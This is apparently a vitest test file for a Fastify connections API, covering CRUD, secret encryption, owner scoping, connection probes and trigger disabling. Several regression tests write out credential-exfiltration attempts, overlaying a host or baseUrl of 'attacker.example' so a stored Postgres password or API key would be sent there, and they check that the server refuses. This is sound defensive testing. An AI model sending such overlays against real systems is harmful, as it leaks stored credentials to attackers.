import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { FastifyInstance } from 'fastify';
import { CATALOG_VERSION, type NewTrigger, type Node } from '@autonomy-studio/shared';
import {
  createConnection,
  createPipeline,
  createPipelineVersion,
  createTrigger,
  getConnection,
  getSecretByRef,
  getTrigger,
  listSecrets,
} from '../../repo/index.js';
import type { Db } from '../../repo/types.js';
import { join } from 'node:path';
import { buildTestAppWithContext } from '../../__tests__/build-test-app.js';

/** Bind an ENABLED schedule trigger to a version that references `connId` on an
 * `llm_call` node — the dependency the reverse-gate must find and disable. */
function bindEnabledTrigger(db: Db, ownerId: string, connId: string): string {
  const pipeline = createPipeline(db, { ownerId, name: 'P' });
  const node: Node = {
    id: 'n1',
    type: 'llm_call',
    config: {},
    connectionId: connId,
    position: { x: 0, y: 0 },
  };
  const version = createPipelineVersion(db, {
    pipelineId: pipeline.id,
    params: [],
    outputs: [],
    nodes: [node],
    edges: [],
    catalogVersion: CATALOG_VERSION,
  });
  const input: NewTrigger = {
    ownerId,
    name: 'T',
    pipelineVersionId: version.id,
    params: {},
    mode: 'schedule',
    schedule: '0 2 * * *',
    webhook: null,
    concurrency: { policy: 'skip_if_running' },
    runWindows: null,
    enabled: true,
  };
  return createTrigger(db, input).id;
}

describe('connections routes', () => {
  let app: FastifyInstance;
  /** The per-test scratch dir — a real, existing directory an `fs` probe can
   * genuinely reach, and the parent of the missing one it genuinely cannot. */
  let tmpDir: string;

  beforeAll(async () => {
    ({ app, tmpDir } = await buildTestAppWithContext());
  });

  afterAll(async () => {
    await app.close();
  });

  it('full CRUD round-trip, owner-scoped', async () => {
    const createRes = await app.inject({
      method: 'POST',
      url: '/api/connections',
      payload: { name: 'My Claude key', kind: 'anthropic_api', config: { model: 'claude-sonnet' } },
    });
    expect(createRes.statusCode).toBe(201);
    const created = createRes.json();
    expect(created.name).toBe('My Claude key');
    expect(created.ownerId).toBe('local');
    expect(created).not.toHaveProperty('secretRef');

    const getRes = await app.inject({ method: 'GET', url: `/api/connections/${created.id}` });
    expect(getRes.statusCode).toBe(200);
    expect(getRes.json()).toEqual(created);

    const listRes = await app.inject({ method: 'GET', url: '/api/connections' });
    expect(listRes.statusCode).toBe(200);
    expect(listRes.json().items.map((c: { id: string }) => c.id)).toContain(created.id);

    const patchRes = await app.inject({
      method: 'PATCH',
      url: `/api/connections/${created.id}`,
      payload: { name: 'Renamed key' },
    });
    expect(patchRes.statusCode).toBe(200);
    expect(patchRes.json().name).toBe('Renamed key');

    const deleteRes = await app.inject({
      method: 'DELETE',
      url: `/api/connections/${created.id}`,
    });
    expect(deleteRes.statusCode).toBe(204);

    const missingRes = await app.inject({ method: 'GET', url: `/api/connections/${created.id}` });
    expect(missingRes.statusCode).toBe(404);
  });

  it('#2 L13b — a PATCH that omits `parameters` PRESERVES the stored allowlist', async () => {
    // The Zod-partial-applies-default gotcha: were `parameters` defaulted on
    // the write body, this rename would silently reset the allowlist to [].
    const createRes = await app.inject({
      method: 'POST',
      url: '/api/connections',
      payload: {
        name: 'Parameterized',
        kind: 'anthropic_api',
        config: { model: 'claude-sonnet' },
        parameters: ['model', 'maxTokens'],
      },
    });
    expect(createRes.statusCode).toBe(201);
    const created = createRes.json();
    expect(created.parameters).toEqual(['model', 'maxTokens']);

    const patchRes = await app.inject({
      method: 'PATCH',
      url: `/api/connections/${created.id}`,
      payload: { name: 'Renamed' },
    });
    expect(patchRes.statusCode).toBe(200);
    expect(patchRes.json().parameters).toEqual(['model', 'maxTokens']);

    // An EXPLICIT parameters patch still updates (and [] still clears).
    const explicit = await app.inject({
      method: 'PATCH',
      url: `/api/connections/${created.id}`,
      payload: { parameters: ['model'] },
    });
    expect(explicit.json().parameters).toEqual(['model']);
    const cleared = await app.inject({
      method: 'PATCH',
      url: `/api/connections/${created.id}`,
      payload: { parameters: [] },
    });
    expect(cleared.json().parameters).toEqual([]);
  });

  it('POST with a plaintext secret never returns it, and stores an encrypted row', async () => {
    const plaintext = 'sk-super-secret-plaintext';
    const res = await app.inject({
      method: 'POST',
      url: '/api/connections',
      payload: { name: 'Keyed connection', kind: 'anthropic_api', config: {}, secret: plaintext },
    });
    expect(res.statusCode).toBe(201);
    const body = res.json();
    expect(body).not.toHaveProperty('secret');
    expect(body).not.toHaveProperty('secretRef');
    expect(JSON.stringify(body)).not.toContain(plaintext);

    const getRes = await app.inject({ method: 'GET', url: `/api/connections/${body.id}` });
    expect(JSON.stringify(getRes.json())).not.toContain(plaintext);
    expect(getRes.json()).not.toHaveProperty('secretRef');

    // Reach into the DB directly (test-only, via `app.db`) to prove a
    // `secrets` row really exists with ciphertext that is NOT the plaintext.
    const internal = getConnection(app.db, body.id);
    expect(internal?.secretRef).toBeTruthy();
    const secretRow = getSecretByRef(app.db, internal!.secretRef!);
    expect(secretRow).not.toBeNull();
    expect(secretRow!.ciphertext).not.toBe(plaintext);
    expect(listSecrets(app.db).some((s) => s.ciphertext === plaintext)).toBe(false);
  });

  it('rotating a connection secret keeps the same secretRef (in-place ciphertext rotation)', async () => {
    const createRes = await app.inject({
      method: 'POST',
      url: '/api/connections',
      payload: { name: 'Rotating', kind: 'anthropic_api', config: {}, secret: 'first-secret' },
    });
    const created = createRes.json();
    const before = getConnection(app.db, created.id);
    expect(before?.secretRef).toBeTruthy();

    const patchRes = await app.inject({
      method: 'PATCH',
      url: `/api/connections/${created.id}`,
      payload: { secret: 'second-secret' },
    });
    expect(patchRes.statusCode).toBe(200);

    const after = getConnection(app.db, created.id);
    expect(after?.secretRef).toBe(before?.secretRef);
    const secretRow = getSecretByRef(app.db, after!.secretRef!);
    expect(secretRow?.ciphertext).not.toBe('second-secret');
    expect(secretRow?.ciphertext).not.toBe('first-secret');
  });

  it('deleting a connection deletes its secret too (no orphan, RESTRICT respected)', async () => {
    const createRes = await app.inject({
      method: 'POST',
      url: '/api/connections',
      payload: { name: 'ToDelete', kind: 'anthropic_api', config: {}, secret: 'delete-me' },
    });
    const created = createRes.json();
    const internal = getConnection(app.db, created.id);
    const ref = internal!.secretRef!;
    expect(getSecretByRef(app.db, ref)).not.toBeNull();

    const deleteRes = await app.inject({
      method: 'DELETE',
      url: `/api/connections/${created.id}`,
    });
    expect(deleteRes.statusCode).toBe(204);

    expect(getSecretByRef(app.db, ref)).toBeNull();
  });

  it('owner scoping: a row belonging to a different owner is filtered from list and 404s on get', async () => {
    const other = createConnection(app.db, {
      ownerId: 'someone-else',
      name: 'Not mine',
      kind: 'http',
      config: {},
      secretRef: null,
    });

    const listRes = await app.inject({ method: 'GET', url: '/api/connections' });
    expect(listRes.json().items.map((c: { id: string }) => c.id)).not.toContain(other.id);

    const getRes = await app.inject({ method: 'GET', url: `/api/connections/${other.id}` });
    expect(getRes.statusCode).toBe(404);
  });

  /**
   * #1191 — the test-connection routes. Everything here drives REAL adapters
   * through the app's own registry: the point of the ticket is that eight
   * implementations had no caller, so a test that mocks the adapter would
   * recreate exactly the gap it is meant to close.
   *
   * `127.0.0.1:1` is the unreachable postgres: no DNS lookup, an immediate
   * refusal, and — the property these tests actually lean on — a refusal the
   * adapter only reaches AFTER its own "this connection has no secret" check.
   * Which of those two sentences comes back is therefore an observation of
   * whether a secret was resolved and handed over, without mocking anything.
   */
  describe('POST /api/connections/test (draft)', () => {
    it('probes a config that has no row behind it', async () => {
      const res = await app.inject({
        method: 'POST',
        url: '/api/connections/test',
        payload: { kind: 'fs', config: { roots: [tmpDir] } },
      });
      expect(res.statusCode).toBe(200);
      expect(res.json()).toEqual({ ok: true, probed: 'liveness' });
    });

    it('returns the adapter’s own refusal sentence for a bad config', async () => {
      const res = await app.inject({
        method: 'POST',
        url: '/api/connections/test',
        payload: { kind: 'fs', config: { roots: [join(tmpDir, 'no-such-dir')] } },
      });
      expect(res.statusCode).toBe(200);
      expect(res.json()).toMatchObject({ ok: false });
      expect(res.json().error).toMatch(/not accessible/);
    });

    it('says `probed: config` for a kind that deliberately reaches nothing', async () => {
      // `agent_cli` does not spawn — running an arbitrary command as a probe
      // would be an unsafe side effect. So this `ok: true` means "the settings
      // parse", and the route must carry that distinction out to the UI rather
      // than letting it read as "this connection works".
      const res = await app.inject({
        method: 'POST',
        url: '/api/connections/test',
        payload: { kind: 'agent_cli', config: { command: 'definitely-not-a-real-binary' } },
      });
      expect(res.json()).toEqual({ ok: true, probed: 'config' });
    });

    it('400s an unknown kind rather than answering about a missing adapter', async () => {
      const res = await app.inject({
        method: 'POST',
        url: '/api/connections/test',
        payload: { kind: 'not_a_real_kind', config: {} },
      });
      expect(res.statusCode).toBe(400);
    });
  });

  describe('POST /api/connections/:id/test (saved)', () => {
    /** A postgres row pointed at a refused local port, optionally with a secret. */
    async function seedPostgres(secret: string | undefined) {
      const res = await app.inject({
        method: 'POST',
        url: '/api/connections',
        payload: {
          name: `pg ${String(secret)}`,
          kind: 'postgres',
          config: { host: '127.0.0.1', port: 1, database: 'app', user: 'app', sslmode: 'disable' },
          ...(secret !== undefined ? { secret } : {}),
        },
      });
      expect(res.statusCode).toBe(201);
      return res.json().id as string;
    }

    it('resolves the STORED secret when the body supplies none', async () => {
      const withSecret = await seedPostgres('stored-pw');
      const withoutSecret = await seedPostgres(undefined);

      const probed = await app.inject({
        method: 'POST',
        url: `/api/connections/${withSecret}/test`,
        payload: {},
      });
      const bare = await app.inject({
        method: 'POST',
        url: `/api/connections/${withoutSecret}/test`,
        payload: {},
      });

      // The secretless row stops at the adapter's own no-secret refusal...
      expect(bare.json().error).toMatch(/has no secret/);
      // ...while the row WITH one gets past it and fails on the socket instead.
      // That difference is the proof the stored ciphertext was decrypted and
      // handed to the adapter; nothing else could move the sentence.
      expect(probed.json().error).not.toMatch(/has no secret/);
      expect(probed.json()).toMatchObject({ ok: false });
    });

    it('never echoes the stored plaintext back to the caller', async () => {
      const id = await seedPostgres('p4ssw0rd-in-the-clear');
      const res = await app.inject({
        method: 'POST',
        url: `/api/connections/${id}/test`,
        payload: {},
      });
      expect(res.body).not.toContain('p4ssw0rd-in-the-clear');
    });

    it('probes the config OVERLAY, not the stored one', async () => {
      const created = await app.inject({
        method: 'POST',
        url: '/api/connections',
        payload: { name: 'fs overlay', kind: 'fs', config: { roots: [tmpDir] } },
      });
      const id = created.json().id as string;

      // Stored config is fine, so a bare probe passes...
      expect(
        (
          await app.inject({ method: 'POST', url: `/api/connections/${id}/test`, payload: {} })
        ).json(),
      ).toEqual({ ok: true, probed: 'liveness' });

      // ...and the overlay — what the edit form has on screen — is what a probe
      // with a body actually tests.
      const overlaid = await app.inject({
        method: 'POST',
        url: `/api/connections/${id}/test`,
        payload: { config: { roots: [join(tmpDir, 'no-such-dir')] } },
      });
      expect(overlaid.json()).toMatchObject({ ok: false });
      expect(overlaid.json().error).toMatch(/not accessible/);
    });

    it('REFUSES to spend the stored secret on a destination the saved row does not name (postgres)', async () => {
      // The exfiltration primitive this rule exists to close: overlay a host,
      // omit the secret, and the server would decrypt the stored password and
      // send it wherever the body said. `CONNECTION_NON_OVERRIDABLE_CONFIG_KEYS`
      // names those keys; the refusal must fire BEFORE any socket is opened.
      const id = await seedPostgres('stored-pw');
      const res = await app.inject({
        method: 'POST',
        url: `/api/connections/${id}/test`,
        payload: {
          // Identical to the stored config in every key BUT `host`, so the
          // refusal names exactly the one that moved.
          config: {
            host: 'attacker.example',
            port: 1,
            database: 'app',
            user: 'app',
            sslmode: 'disable',
          },
        },
      });
      expect(res.json()).toMatchObject({ ok: false });
      expect(res.json().error).toMatch(/would spend the stored secret/);
      expect(res.json().error).toContain('host');
    });

    it('REFUSES an API-key kind whose baseUrl the overlay moved — the hole an allowlist left open', async () => {
      // THE REGRESSION TEST. `anthropic_api` sends the stored key to
      // `config.baseUrl` as an `x-api-key` header (`anthropic.ts`), and its
      // entry in `CONNECTION_NON_OVERRIDABLE_CONFIG_KEYS` is EMPTY — so the
      // first version of this guard, which consulted that table, permitted
      // exactly this request. `openai_api` and `http` are the same shape.
      // Nothing about postgres would have caught it: the kinds whose credential
      // is easiest to spend were the ones the allowlist did not cover.
      const created = await app.inject({
        method: 'POST',
        url: '/api/connections',
        payload: {
          name: 'anthropic exfil',
          kind: 'anthropic_api',
          config: { baseUrl: 'https://api.anthropic.com' },
          secret: 'sk-ant-stored',
        },
      });
      const res = await app.inject({
        method: 'POST',
        url: `/api/connections/${created.json().id}/test`,
        payload: { config: { baseUrl: 'https://attacker.example' } },
      });
      expect(res.json()).toMatchObject({ ok: false });
      expect(res.json().error).toMatch(/would spend the stored secret/);
      expect(res.json().error).toContain('baseUrl');
      // And the key itself never travelled — not to the attacker, not back here.
      expect(res.body).not.toContain('sk-ant-stored');
    });

    it('REFUSES a harmless-looking change too — the rule is the whole config', async () => {
      // `model` moves no destination, and an allowlist would wave it through.
      // The rule is deliberately total anyway: enumerating which keys are
      // dangerous is a standing bet about every adapter's future, and it fails
      // OPEN. The operator loses nothing they cannot recover by saving first or
      // typing the secret, and the sentence says both.
      const created = await app.inject({
        method: 'POST',
        url: '/api/connections',
        payload: {
          name: 'anthropic model edit',
          kind: 'anthropic_api',
          config: { baseUrl: 'https://api.anthropic.com', model: 'claude-opus-4-8' },
          secret: 'sk-ant-stored',
        },
      });
      const res = await app.inject({
        method: 'POST',
        url: `/api/connections/${created.json().id}/test`,
        payload: {
          config: { baseUrl: 'https://api.anthropic.com', model: 'claude-sonnet-4-5' },
        },
      });
      expect(res.json().error).toMatch(/would spend the stored secret/);
      expect(res.json().error).toContain('model');
    });

    it('allows an UNCHANGED overlay — an edit-form probe that touched nothing', async () => {
      // The form sends its whole config on every Test, so the ordinary
      // "open Edit, press Test" path posts an overlay identical to the stored
      // row. That must reach the adapter, or the button would be refused far
      // more often than it works.
      const id = await seedPostgres('stored-pw');
      const res = await app.inject({
        method: 'POST',
        url: `/api/connections/${id}/test`,
        payload: {
          config: { host: '127.0.0.1', port: 1, database: 'app', user: 'app', sslmode: 'disable' },
        },
      });
      expect(res.json().error).not.toMatch(/would spend the stored secret/);
    });

    it('allows the same overlay when the body brings its OWN secret', async () => {
      // The SAME host change the previous test refuses — but with a secret in
      // the body, so nothing stored is spent and there is nothing to
      // exfiltrate. This is the ordinary operator move (repoint the connection,
      // type the password, test it), and the refusal must be narrow enough not
      // to swallow it.
      const id = await seedPostgres('stored-pw');
      const res = await app.inject({
        method: 'POST',
        url: `/api/connections/${id}/test`,
        payload: {
          config: {
            host: 'attacker.example',
            port: 1,
            database: 'app',
            user: 'app',
            sslmode: 'disable',
          },
          secret: 'typed-in-the-form',
        },
      });
      expect(res.json().error).not.toMatch(/would spend the stored secret/);
    });

    it('allows a boundary-key overlay on a connection that holds NO secret', async () => {
      // `fs.roots` is a boundary key, but an `fs` connection has no credential,
      // so the rule has nothing to protect and must not block an ordinary edit.
      const created = await app.inject({
        method: 'POST',
        url: '/api/connections',
        payload: { name: 'fs no secret', kind: 'fs', config: { roots: [tmpDir] } },
      });
      const res = await app.inject({
        method: 'POST',
        url: `/api/connections/${created.json().id}/test`,
        payload: { config: { roots: [join(tmpDir, 'no-such-dir')] } },
      });
      // Reaches the adapter (and fails there on the missing dir) rather than
      // being refused at the boundary check.
      expect(res.json().error).toMatch(/not accessible/);
    });

    it('404s another owner’s connection', async () => {
      const other = createConnection(app.db, {
        ownerId: 'someone-else',
        name: 'Not mine',
        kind: 'fs',
        config: { roots: [tmpDir] },
        secretRef: null,
      });
      const res = await app.inject({
        method: 'POST',
        url: `/api/connections/${other.id}/test`,
        payload: {},
      });
      expect(res.statusCode).toBe(404);
    });
  });

  it('validation: a bad body returns 400 with a structured error, no stack trace', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/connections',
      payload: { name: '', kind: 'not_a_real_kind', config: {} },
    });
    expect(res.statusCode).toBe(400);
    const body = res.json();
    expect(body.error).toBe('validation_error');
    expect(Array.isArray(body.issues)).toBe(true);
    expect(JSON.stringify(body)).not.toMatch(/\.ts:\d+/);
  });

  it('404 for a missing connection', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/api/connections/conn_does_not_exist',
    });
    expect(res.statusCode).toBe(404);
    expect(res.json().error).toBe('not_found');
  });

  describe('#3 G8b-2 reverse-gate — a post-hoc unready connection disables dependent triggers', () => {
    it('PATCH kind→needs_secret disables a dependent enabled trigger', async () => {
      // A credential-less `ollama` connection is READY (`not_required`).
      const created = (
        await app.inject({
          method: 'POST',
          url: '/api/connections',
          payload: { name: 'Local', kind: 'ollama', config: {} },
        })
      ).json();
      const triggerId = bindEnabledTrigger(app.db, 'local', created.id);
      expect(getTrigger(app.db, triggerId)!.enabled).toBe(true);

      // Change the kind to a secret-requiring one with NO secret → needs_secret.
      const patchRes = await app.inject({
        method: 'PATCH',
        url: `/api/connections/${created.id}`,
        payload: { kind: 'anthropic_api' },
      });
      expect(patchRes.statusCode).toBe(200);
      expect(patchRes.json().secretStatus).toBe('needs_secret');
      // The reverse-gate flipped the dependent trigger off.
      expect(getTrigger(app.db, triggerId)!.enabled).toBe(false);
    });

    it('a PATCH that keeps the connection READY (a rename) leaves dependents enabled', async () => {
      const created = (
        await app.inject({
          method: 'POST',
          url: '/api/connections',
          payload: { name: 'Local', kind: 'ollama', config: {} },
        })
      ).json();
      const triggerId = bindEnabledTrigger(app.db, 'local', created.id);

      const patchRes = await app.inject({
        method: 'PATCH',
        url: `/api/connections/${created.id}`,
        payload: { name: 'Renamed' },
      });
      expect(patchRes.statusCode).toBe(200);
      expect(getTrigger(app.db, triggerId)!.enabled).toBe(true);
    });

    it('DELETE disables a dependent enabled trigger (it folds to missing)', async () => {
      const created = (
        await app.inject({
          method: 'POST',
          url: '/api/connections',
          payload: { name: 'Local', kind: 'ollama', config: {} },
        })
      ).json();
      const triggerId = bindEnabledTrigger(app.db, 'local', created.id);

      const deleteRes = await app.inject({
        method: 'DELETE',
        url: `/api/connections/${created.id}`,
      });
      expect(deleteRes.statusCode).toBe(204);
      expect(getTrigger(app.db, triggerId)!.enabled).toBe(false);
    });
  });
});
